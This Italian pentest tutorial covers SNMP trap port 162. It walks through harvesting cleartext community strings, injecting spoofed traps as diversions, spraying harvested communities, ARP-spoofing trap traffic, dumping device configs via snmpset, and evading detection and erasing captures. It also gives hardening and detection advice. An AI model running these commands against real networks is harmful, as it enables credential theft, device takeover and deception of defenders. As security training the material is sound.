---
title: 'Porta 162 SNMP Trap: cos’è, come funziona e differenze con la porta 161'
slug: porta-162-snmptrap
description: 'Scopri a cosa serve la porta 162 SNMP Trap, come funziona il canale di notifica rispetto alla porta 161, quali rischi introduce con SNMPv1/v2c e come sfruttarla in reconnaissance, sniffing e raccolta di intelligence passiva.'
image: /porta-162-snmp-trap.webp
draft: true
date: 2026-04-03T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - snmp-trap
---

Porta 162 SNMP Trap è il canale UDP su cui dispositivi di rete, server e appliance inviano notifiche asincrone (trap) verso i manager SNMP. A differenza della porta 161 usata per query/polling, la 162 riceve dati in push: allarmi, cambi di stato, errori hardware, autenticazioni fallite. Per un pentester questa porta è una miniera di intelligence passiva. Attraverso l'enumerazione porta 162 puoi raccogliere community string in chiaro, topologie di rete, credenziali embedded nei trap e informazioni su dispositivi che nessun scan attivo rivelerebbe. Nella kill chain si posiziona tra recon e initial access: i dati raccolti alimentano direttamente le fasi successive.

In questo articolo impari a intercettare trap SNMP, estrarre dati operativi, abusare community string deboli e integrare tutto nella tua pipeline offensiva.

## 1. Anatomia Tecnica della Porta 162

La porta 162 è registrata IANA come `snmptrap` su protocollo UDP. Il flusso operativo è invertito rispetto alla classica query SNMP:

1. Un evento si verifica sul device (link down, auth failure, soglia superata)
2. L'agente SNMP sul device costruisce una PDU trap
3. La PDU viene inviata via UDP alla porta 162 del manager configurato
4. Il manager riceve, logga e opzionalmente esegue azioni

Le varianti principali sono SNMPv1 Trap (community string in chiaro, formato PDU specifico), SNMPv2c Trap/Inform (community in chiaro ma formato PDU unificato, Inform aggiunge conferma di ricezione) e SNMPv3 Trap (autenticazione e cifratura opzionali con USM).

***

**Misconfig: Community string di default nei trap**

Impatto: L'attacker cattura la community string `public` o `private` dal traffico trap e la usa per query/set sulla porta 161.

Come si verifica:

```bash
sudo tcpdump -i eth0 udp port 162 -A | grep -i community
```

***

**Misconfig: Trap inviati senza SNMPv3 (no auth, no encryption)**

Impatto: Qualsiasi host sulla rete può sniffare trap e leggere OID, valori, indirizzi IP interni.

Come si verifica:

```bash
sudo tcpdump -i eth0 udp port 162 -vvv -X
```

***

**Misconfig: Trap destination non filtrata (nessuna ACL)**

Impatto: Un attacker può impersonare un trap receiver e raccogliere tutte le notifiche configurate.

Come si verifica:

```bash
nmap -sU -p 162 --open [subnet/24]
```

***

## 2. Enumerazione Base della Porta 162

L'enumerazione porta 162 richiede un approccio diverso dalle porte TCP. Essendo UDP e ricevendo dati in push, non puoi semplicemente connetterti e aspettare un banner. Devi prima verificare se la porta è aperta, poi posizionarti come listener.

### Comando 1: Nmap

```bash
nmap -sU -p 162 -sV --reason 10.10.10.0/24
```

**Output atteso:**

```
PORT    STATE         SERVICE  REASON
162/udp open          snmptrap udp-response
162/udp open|filtered snmptrap no-response
```

**Parametri:**

* `-sU`: scan UDP (necessario, la 162 è esclusivamente UDP)
* `-p 162`: limita lo scan alla sola porta trap
* `-sV`: tenta il fingerprint del servizio in ascolto
* `--reason`: mostra perché nmap classifica lo stato (utile per distinguere open da filtered)

### Comando 2: Listener con snmptrapd

```bash
sudo snmptrapd -f -Lo -n udp:162
```

**Output atteso:**

```
NET-SNMP version 5.9.4
2026-02-06 14:23:01 10.10.10.5 [UDP: [10.10.10.5]:45321->[10.10.10.100]:162]:
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (15423200) 1 day, 18:50:32.00
SNMPv2-MIB::snmpTrapOID.0 = OID: IF-MIB::linkDown
IF-MIB::ifIndex.3 = INTEGER: 3
IF-MIB::ifDescr.3 = STRING: GigabitEthernet0/3
IF-MIB::ifType.3 = INTEGER: ethernetCsmacd(6)
```

**Cosa ci dice questo output:** il device 10.10.10.5 sta inviando trap linkDown per l'interfaccia GigabitEthernet0/3. Hai l'IP sorgente, l'uptime del device, il tipo di interfaccia e il suo indice. Con queste informazioni puoi interrogare direttamente il device sulla porta 161 per estrarre la configurazione completa. Vedi anche la guida all'[enumerazione SNMP sulla porta 161](https://hackita.it/articoli/snmp).

## 3. Enumerazione Avanzata

### Intercettazione trap con filtro OID

Puoi filtrare i trap per tipo di evento usando **snmptrapd** con configurazione mirata. Questo ti permette di isolare solo le notifiche rilevanti (auth failure, config change, ecc.).

```bash
sudo snmptrapd -f -Lo -n udp:162 2>&1 | grep -E "authenticationFailure|coldStart|warmStart|linkDown"
```

**Output:**

```
2026-02-06 14:30:12 10.10.10.1 [UDP: [10.10.10.1]:32001]:
SNMPv2-MIB::snmpTrapOID.0 = OID: SNMPv2-MIB::authenticationFailure
2026-02-06 14:31:45 10.10.10.20 [UDP: [10.10.10.20]:32055]:
SNMPv2-MIB::snmpTrapOID.0 = OID: SNMPv2-MIB::coldStart
```

**Lettura dell'output:** `authenticationFailure` significa che qualcuno (o qualcosa) sta tentando query SNMP con una community string sbagliata sul device 10.10.10.1. Questo conferma che il device usa SNMP e che la community non è quella di default. `coldStart` dal .20 indica un reboot recente, possibile finestra di config debole post-boot.

### Cattura community string in transito

Con **tcpdump** puoi estrarre le community string direttamente dal traffico trap, dato che SNMPv1/v2c le trasmette in chiaro.

```bash
sudo tcpdump -i eth0 udp port 162 -vvv -A 2>&1 | grep -oP '[\x20-\x7e]{4,}' | sort -u
```

**Output:**

```
public
monitoring_2024
netw0rk_RO
```

**Lettura dell'output:** hai tre community string distinte. `public` è il default, le altre due sono custom. Ognuna va testata sulla porta 161 di ciascun host scoperto per verificare se consente lettura o scrittura. Approfondisci le tecniche di [enumerazione SNMP sulla porta 161](https://hackita.it/articoli/snmp) per sfruttare queste community string.

### Script NSE per SNMP trap analysis

```bash
nmap -sU -p 162 --script snmp-info,snmp-netstat,snmp-processes 10.10.10.5
```

**Output:**

```
PORT    STATE SERVICE
162/udp open  snmptrap
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: mac
|   engineIDData: 00:0c:29:a1:b2:c3
|   snmpEngineBoots: 12
|_  snmpEngineTime: 3d 04:12:33
```

**Lettura dell'output:** l'engineID basato su MAC rivela il vendor (VMware in questo caso: `00:0c:29`). Il numero di boot (12) suggerisce instabilità o manutenzione frequente. L'engineTime conferma che il device è attivo da 3 giorni dall'ultimo reboot. Per approfondire gli script NSE utili nel recon vedi la [guida a nmap](https://hackita.it/articoli/nmap).

### Trap spoofing per test di validazione

Verifichi se il manager SNMP accetta trap da qualsiasi sorgente usando **snmptrap** come tool di invio:

```bash
snmptrap -v 2c -c public 10.10.10.100:162 '' SNMPv2-MIB::coldStart
```

**Output:**

```
(nessun output = trap inviato con successo, nessun errore)
```

**Lettura dell'output:** se non ricevi errori, il manager ha accettato il trap. Questo conferma l'assenza di ACL o validazione sorgente. Puoi iniettare trap arbitrari per generare alert falsi o per testare la risposta del SOC.

## 4. Tecniche Offensive sulla Porta 162

### Community String Harvesting passivo

Contesto: qualsiasi rete con SNMPv1/v2c attivo e trap configurati. Funziona in ambienti enterprise dove i trap raggiungono un collector centralizzato.

```bash
sudo tshark -i eth0 -f "udp port 162" -Y "snmp" -T fields -e ip.src -e snmp.community -e snmp.name
```

**Output (successo):**

```
10.10.10.1	private	1.3.6.1.6.3.1.1.5.3
10.10.10.5	n3twork_RW	1.3.6.1.6.3.1.1.5.4
10.10.10.20	public	1.3.6.1.6.3.1.1.5.1
```

**Output (fallimento):**

```
Capturing on 'eth0'
0 packets captured
```

**Cosa fai dopo:** la community `n3twork_RW` contiene "RW" nel nome, probabile read-write. Testi immediatamente con `snmpset` sulla porta 161 del target 10.10.10.5 per verificare se puoi modificare la configurazione del device. Scopri come sfruttare community RW nella [guida al bruteforce SNMP](https://hackita.it/articoli/bruteforce).

### Trap Injection per falsi allarmi

Contesto: manager SNMP senza validazione sorgente. Utile per diversione durante un'operazione red team.

```bash
snmptrap -v 2c -c public 10.10.10.100:162 '' IF-MIB::linkDown IF-MIB::ifIndex i 1 IF-MIB::ifDescr s "GigabitEthernet0/0"
```

**Output (successo):**

```
(nessun output, trap accettato)
```

**Output (fallimento):**

```
snmptrap: Timeout
```

**Cosa fai dopo:** il trap iniettato simula un link down sulla interfaccia principale. Se il SOC reagisce, hai creato una diversione. Se hai accesso RW, puoi combinare questa tecnica con modifiche reali alla configurazione del device. Vedi [tecniche di red team e diversione](https://hackita.it/articoli/red-team).

### SNMP Credential Spray via community da trap

Contesto: dopo aver raccolto community string dai trap, le usi contro tutti gli host della rete sulla porta 161.

```bash
for host in $(cat hosts.txt); do
  for comm in $(cat communities.txt); do
    snmpwalk -v 2c -c "$comm" -t 1 -r 1 "$host" system 2>/dev/null && echo "[+] $host : $comm"
  done
done
```

**Output (successo):**

```
SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, C2960 Software...
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.9.1.1208
[+] 10.10.10.1 : n3twork_RW
```

**Output (fallimento):**

```
Timeout: No Response from 10.10.10.1
```

**Cosa fai dopo:** community RW confermata su un Cisco C2960. Puoi scaricare la running-config tramite SNMP e cercare credenziali Telnet/SSH embedded. Segui la [kill chain completa](https://hackita.it/articoli/killchain) per passare da config dump a accesso diretto.

### ARP spoofing per redirect dei trap

Contesto: segmento di rete senza protezione ARP (no Dynamic ARP Inspection). Funziona in lab e in reti flat enterprise.

```bash
sudo arpspoof -i eth0 -t 10.10.10.5 10.10.10.100
```

**Output (successo):**

```
0:c:29:a1:b2:c3 0:c:29:d4:e5:f6 0806 42: arp reply 10.10.10.100 is-at 0:c:29:a1:b2:c3
```

**Output (fallimento):**

```
arpspoof: couldn't arp for host 10.10.10.100
```

**Cosa fai dopo:** i trap destinati al manager (10.10.10.100) ora arrivano a te. Combini con il listener snmptrapd per catturare community string e dati operativi in tempo reale. Approfondisci le tecniche di [man-in-the-middle sulla rete](https://hackita.it/articoli/mitm).

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con NMS centralizzato

**Situazione:** rete corporate con 200+ device di rete. Un NMS (SolarWinds/Zabbix) raccoglie trap sulla porta 162. VLAN management separata ma accessibile da un host compromesso.

**Step 1:**

```bash
sudo tcpdump -i eth0 udp port 162 -w trap_capture.pcap -c 500
```

**Output atteso:**

```
tcpdump: listening on eth0, link-type EN10MB
500 packets captured
```

**Step 2:**

```bash
tshark -r trap_capture.pcap -Y "snmp" -T fields -e ip.src -e snmp.community | sort -u
```

**Output atteso:**

```
10.10.10.1	monitoring_2024
10.10.10.5	monitoring_2024
10.10.10.20	sw_readonly
10.10.10.50	private
```

**Se fallisce:**

* Causa probabile: sei su una VLAN diversa da quella di management, i trap non transitano dal tuo segmento
* Fix: verifica con `tcpdump -i eth0 udp port 162 -c 1 -v` se vedi traffico. Se zero, devi prima fare lateral movement verso la VLAN di management. Vedi [lateral movement su reti segmentate](https://hackita.it/articoli/lateral-movement).

**Tempo stimato:** 10-30 minuti per la cattura, dipende dalla frequenza dei trap.

### Scenario 2: Lab/CTF con SNMP misconfigured

**Situazione:** singolo host target con SNMP attivo, trap destination impostata su broadcast. Nessun firewall perimetrale.

**Step 1:**

```bash
nmap -sU -p 161,162 -sV --script snmp-brute 10.10.10.5
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv2c
| snmp-brute:
|   public - Valid credentials
|_  private - Valid credentials
162/udp open  snmptrap
```

**Step 2:**

```bash
snmpwalk -v 2c -c private 10.10.10.5 .1
```

**Output atteso:**

```
SNMPv2-MIB::sysDescr.0 = STRING: Linux target 5.15.0-91-generic
SNMPv2-MIB::sysContact.0 = STRING: admin@lab.local
NET-SNMP-EXTEND-MIB::nsExtendCommand."test" = STRING: /usr/local/bin/backup.sh
```

**Se fallisce:**

* Causa probabile: la community `private` ha permessi solo read, non walk completo
* Fix: prova con `snmpbulkwalk` per maggiore efficienza: `snmpbulkwalk -v 2c -c private -Cr25 10.10.10.5 .1`

**Tempo stimato:** 5-10 minuti.

### Scenario 3: OT/ICS con device legacy

**Situazione:** rete industriale con PLC e switch managed che usano SNMPv1. Trap configurati verso un HMI su porta 162. Nessuna segmentazione tra IT e OT.

**Step 1:**

```bash
sudo snmptrapd -f -Lo -n udp:162 2>&1 | tee ot_traps.log
```

**Output atteso:**

```
2026-02-06 15:00:01 192.168.1.10 [UDP: [192.168.1.10]:161]:
SNMPv2-MIB::snmpTrapOID.0 = OID: SNMPv2-SMI::enterprises.2699.1.2.0.1
SNMPv2-MIB::sysDescr.0 = STRING: Siemens SCALANCE X208 V4.1
```

**Step 2:**

```bash
snmpwalk -v 1 -c public 192.168.1.10 system
```

**Output atteso:**

```
SNMPv2-MIB::sysDescr.0 = STRING: Siemens SCALANCE X208 V4.1
SNMPv2-MIB::sysName.0 = STRING: OT-SW-PROD-01
SNMPv2-MIB::sysLocation.0 = STRING: Plant Floor - Rack 3
```

**Se fallisce:**

* Causa probabile: SNMPv1 su device OT spesso ha timeout molto bassi
* Fix: aumenta timeout e retry: `snmpwalk -v 1 -c public -t 5 -r 3 192.168.1.10 system`

**Tempo stimato:** 5-15 minuti, dipende dalla reattività dei device OT. Per il contesto OT/ICS vedi [pentest su reti industriali](https://hackita.it/articoli/ics-ot).

## 6. Attack Chain Completa

```
Recon (sniffing trap) → Community Harvesting → SNMP Walk/Set → Config Dump → Credential Extraction → Initial Access (SSH/Telnet) → PrivEsc → Persistence
```

| Fase               | Tool       | Comando chiave                                             | Output/Risultato                          |
| ------------------ | ---------- | ---------------------------------------------------------- | ----------------------------------------- |
| Recon              | tcpdump    | `tcpdump -i eth0 udp port 162 -A`                          | IP sorgenti, community string, OID        |
| Community Harvest  | tshark     | `tshark -f "udp port 162" -T fields -e snmp.community`     | Lista community string                    |
| SNMP Enum          | snmpwalk   | `snmpwalk -v 2c -c [comm] [target] .1`                     | Config completa, processi, interfacce     |
| Config Dump        | snmpset    | `snmpset -v 2c -c [RW] [target] [TFTP OID]`                | Running-config su TFTP server controllato |
| Credential Extract | grep       | `grep -i "password\|secret\|enable" config.txt`            | Password enable, VTY, user locali         |
| Initial Access     | ssh/telnet | `ssh admin@[target]`                                       | Shell sul device                          |
| Persistence        | snmpset    | `snmpset -v 2c -c [RW] [target] [sysContact] s "backdoor"` | Modifica config persistente               |

**Timeline stimata:** 30-90 minuti dall'inizio dello sniffing all'accesso SSH, dipende dal traffico trap e dalla presenza di community RW.

**Ruolo della porta 162:** abilita la raccolta passiva di community string e intelligence sulla rete senza generare traffico attivo. È il punto di ingresso silenzioso che trasforma un posizionamento sulla rete in accesso ai device.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Syslog del NMS**: trap ricevuti da sorgenti non in whitelist. Path tipico: `/var/log/snmptrapd.log` o database del NMS
* **SIEM rule**: alert su trap `authenticationFailure` ripetuti (indica brute di community string)
* **IDS/IPS**: regole Snort/Suricata per SNMP community string note (SID 1411-1418 per community default)
* **Netflow**: flussi UDP/162 anomali (sorgenti nuove, volumi inattesi)

### Tecniche di Evasion

**Sniffing passivo puro**

Usa tcpdump/tshark in modalità promiscua senza iniettare traffico. Non generi pacchetti, solo ascolti. Riduzione rumore: zero log generati sul target, invisibile a IDS/IPS.

**Rate limiting sullo spray di community**

Inserisci sleep 3-5 secondi tra ogni tentativo snmpwalk, usa `-t 1 -r 1` per ridurre retry. Evita il trigger su regole "SNMP brute force" che cercano più di 10 tentativi al minuto.

**Spoofing IP sorgente del trap**

Usa scapy per inviare trap con IP sorgente del legittimo manager, rendendo il traffico indistinguibile. Il trap appare provenire da una sorgente autorizzata, nessun alert su sorgente sconosciuta. Vedi [tecniche di spoofing con Scapy](https://hackita.it/articoli/scapy).

### Cleanup Post-Exploitation

* Se hai modificato config via SNMP SET: ripristina i valori originali con `snmpset` inverso
* Se hai usato arpspoof: termina il processo e lascia che le tabelle ARP si ripristinino (tipicamente 60-300 secondi)
* Elimina i file `.pcap` catturati dall'host compromesso: `shred -u trap_capture.pcap`

## 8. Toolchain e Confronto

### Pipeline operativa

```
tcpdump/tshark (sniffing) → Porta 162 → snmptrapd (parsing) → snmpwalk/snmpset (porta 161) → config dump → grep credenziali → ssh/telnet (accesso)
```

Dati che passano tra fasi: IP sorgente dei device, community string, OID enterprise, versione firmware, hostname, location, credenziali da config, hash enable password.

### Tabella comparativa

| Aspetto              | SNMP Trap (162/UDP)                 | SNMP Poll (161/UDP)      | Syslog (514/UDP)              |
| -------------------- | ----------------------------------- | ------------------------ | ----------------------------- |
| Porta default        | 162                                 | 161                      | 514                           |
| Direzione            | Device → Manager                    | Manager → Device         | Device → Server               |
| Cifratura            | Solo con SNMPv3                     | Solo con SNMPv3          | Solo con TLS (rsyslog)        |
| Community esposta    | Sì (v1/v2c)                         | Sì (v1/v2c)              | N/A                           |
| Intelligence passiva | Alta (sniffing)                     | Bassa (richiede query)   | Media (log in chiaro)         |
| Rischio abuse        | Medio-alto                          | Alto (SET)               | Basso                         |
| Quando preferirlo    | Recon silenziosa, harvest community | Enum attiva, config dump | Raccolta log, timeline eventi |

## 9. Troubleshooting

| Errore / Sintomo                               | Causa                                                             | Fix                                                                              |
| ---------------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| `nmap -sU` mostra `open\|filtered` su 162      | UDP scan non riceve risposta (normale per trap receiver inattivo) | Passa a sniffing passivo: `tcpdump -i eth0 udp port 162` per confermare traffico |
| `snmptrapd` non riceve trap                    | Firewall locale blocca UDP 162 in ingresso                        | `sudo iptables -I INPUT -p udp --dport 162 -j ACCEPT`                            |
| `tshark` non mostra campo `snmp.community`     | Trap in SNMPv3 con auth/priv, community non presente              | Verifica versione: `tshark -r file.pcap -Y "snmp.version"`                       |
| `snmptrap` restituisce timeout                 | Host destination non raggiungibile o porta filtrata               | Verifica routing: `traceroute -U -p 162 [target]`                                |
| Community raccolte non funzionano su porta 161 | Community diverse per trap e polling (config separata sul device) | Prova tutte le community raccolte, incluse varianti con suffisso `_RO` o `_RW`   |

## 10. FAQ

**D: Come intercettare SNMP trap sulla porta 162 durante un pentest?**

R: Usa `sudo snmptrapd -f -Lo -n udp:162` per avviare un listener locale. Se sei sulla stessa VLAN del manager SNMP, puoi anche catturare trap in transito con `tcpdump -i eth0 udp port 162 -A`. Per reti switched, serve prima ARP spoofing o accesso a una porta SPAN.

**D: Porta 162 SNMP Trap è TCP o UDP?**

R: La porta 162 usa esclusivamente UDP. SNMP trap è un protocollo fire-and-forget: il device invia la notifica senza attendere conferma. L'eccezione è SNMPv2c Inform, che usa UDP ma richiede un acknowledgment dal receiver.

**D: Come estrarre community string dal traffico SNMP trap?**

R: Con tshark: `tshark -i eth0 -f "udp port 162" -T fields -e snmp.community`. Funziona solo con SNMPv1/v2c. Se il traffico è SNMPv3, la community non è presente e devi cercare l'engineID per altri attacchi.

**D: Differenza tra porta 161 e porta 162 SNMP nel pentest?**

R: La porta 161 riceve query dal manager (polling attivo, genera traffico). La porta 162 riceve notifiche dai device (push passivo). Per il pentester, la 162 è ideale per intelligence passiva senza generare rumore, mentre la 161 serve per enumerazione attiva e config dump. Vedi la [guida completa a SNMP 161](https://hackita.it/articoli/snmp) per il confronto operativo.

**D: Quali tool servono per testare la porta 162 SNMP Trap?**

R: Il kit base include: `snmptrapd` (listener), `tshark`/`tcpdump` (cattura), `snmptrap` (invio trap di test), `snmpwalk` (verifica community raccolte sulla 161). Su Kali sono tutti preinstallati nel pacchetto `snmp` e `snmp-mibs-downloader`.

**D: Come proteggere la porta 162 dagli attacchi SNMP trap spoofing?**

R: Migra a SNMPv3 con auth+priv (SHA+AES minimo). Configura ACL che accettino trap solo da sorgenti note. Attiva Dynamic ARP Inspection sugli switch per bloccare ARP spoofing. Monitora trap da sorgenti non in whitelist nel SIEM.

## 11. Cheat Sheet Finale

| Azione                  | Comando                                                                | Note                                             |
| ----------------------- | ---------------------------------------------------------------------- | ------------------------------------------------ |
| Scan UDP porta 162      | `nmap -sU -p 162 -sV --reason [target]`                                | Aggiungere `--reason` per capire stato           |
| Listener trap           | `sudo snmptrapd -f -Lo -n udp:162`                                     | Richiede root per bind su porta inferiore a 1024 |
| Cattura pcap            | `sudo tcpdump -i eth0 udp port 162 -w traps.pcap`                      | `-c 500` per limitare pacchetti                  |
| Estrai community        | `tshark -r traps.pcap -T fields -e ip.src -e snmp.community`           | Solo v1/v2c                                      |
| Filtra auth failure     | `snmptrapd -f -Lo 2>&1 \| grep authenticationFailure`                  | Indica brute force in corso                      |
| Invia trap di test      | `snmptrap -v 2c -c public [target]:162 '' coldStart`                   | Verifica se il manager accetta                   |
| Spray community         | `snmpwalk -v 2c -c [comm] -t 1 -r 1 [target] system`                   | Testa ogni community raccolta                    |
| ARP spoof per redirect  | `sudo arpspoof -i eth0 -t [device] [manager]`                          | Richiede essere sulla stessa VLAN                |
| Analisi live con filtro | `tshark -i eth0 -f "udp port 162" -Y "snmp.name contains 1.3.6.1.6.3"` | Filtra trap standard                             |
| Verifica versione SNMP  | `tshark -r traps.pcap -Y "snmp.version == 0"`                          | 0=v1, 1=v2c, 3=v3                                |

### Perché Porta 162 è rilevante nel 2026

SNMP resta il protocollo di monitoring dominante nelle infrastrutture enterprise e OT/ICS. La migrazione a SNMPv3 è lenta: verifica lo stato nella tua rete target con `snmpwalk -v 3` e fallback a v2c. I device legacy (switch L2, UPS, sensori industriali) spesso supportano solo v1/v2c. Ogni trap non cifrato è un leak di intelligence gratuito per chi sa ascoltare.

### Hardening e Mitigazione

* Migra tutti i device a SNMPv3 con `authPriv` (config su Cisco: `snmp-server group v3group v3 priv`)
* Configura ACL sui device per limitare trap destination: `snmp-server host [manager_IP] traps version 3 priv [user]`
* Abilita Dynamic ARP Inspection sugli switch managed: `ip arp inspection vlan [X]`
* Monitora trap da sorgenti non autorizzate con regola SIEM su `snmptrapd.log`

### OPSEC per il Red Team

Lo sniffing passivo sulla porta 162 genera zero rumore: non invii pacchetti, non compari in nessun log. Il livello di rischio sale quando inizi a usare le community raccolte sulla 161 (query attive, log sul device). Per ridurre visibilità: usa `-t 1 -r 1` su snmpwalk (timeout minimo, un solo retry), distanzia le query di almeno 5 secondi, e non fare mai `snmpwalk .1` completo su device di produzione (genera migliaia di pacchetti). Approfondisci l'[OPSEC per red team](https://hackita.it/articoli/opsec).

***

Tutti i comandi e le tecniche descritti in questo articolo sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto firmato, laboratori personali, piattaforme CTF. Riferimento tecnico: RFC 3412 (SNMP Message Processing), RFC 3414 (USM per SNMPv3).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
